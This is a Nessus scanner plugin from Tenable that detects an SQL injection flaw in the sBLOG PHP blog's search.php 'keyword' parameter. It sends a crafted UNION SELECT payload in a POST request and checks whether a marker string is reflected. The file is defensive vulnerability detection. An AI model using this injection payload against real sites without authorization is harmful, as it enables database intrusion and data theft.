#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21313);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-2189");
  script_bugtraq_id(17782);
  script_xref(name:"OSVDB", value:"25612");

  script_name(english:"sBLOG keyword Parameter SQL Injection Vulnerability");
  script_summary(english:"Checks for keyword parameter SQL injection in sBLOG");
 
  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to SQL
injection attacks. 

Description :

The remote host is running sBLOG, a PHP-based blog application. 

The installed version of sBLOG fails to validate user input to the
'keyword' parameter of the 'search.php' script before using it to
generate database queries.  Regardless of PHP's 'magic_quotes_gpc'
setting, an unauthenticated attacker can leverage this issue to
manipulate database queries to, for instance, bypass authentication,
disclose sensitive information, modify data, or launch attacks against
the underlying database. 

See also :

http://www.securityfocus.com/archive/1/432724/30/0/threaded

Solution :

Unknown at this time.

Risk factor : 

High / CVSS Base Score : 9.9
(AV:R/AC:L/Au:NR/C:C/I:C/A:C/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/sblog", "/blog", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Check whether the affected script exists.
  url = string(dir, "/search.php");

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("sBLOG" >< res && '<input type="text" name="keyword"' >< res)
  {
    magic = string("nessus-", unixtime());

    postdata = string(
      "keyword=", urlencode(str:string(SCRIPT_NAME, "%' UNION SELECT '", magic, "',1,2/*"))
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: Mozilla/4.75 [en] (X11, U; Nessus)\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # There's a problem if we see our magic string as the post topic.
    if (egrep(pattern:string('class="sblog_post_topic"><a href="[^"]+/blog\\.php\\?id=', magic, '"'), string:res))
    {
      security_hole(port);
      exit(0);
    }
  }
}
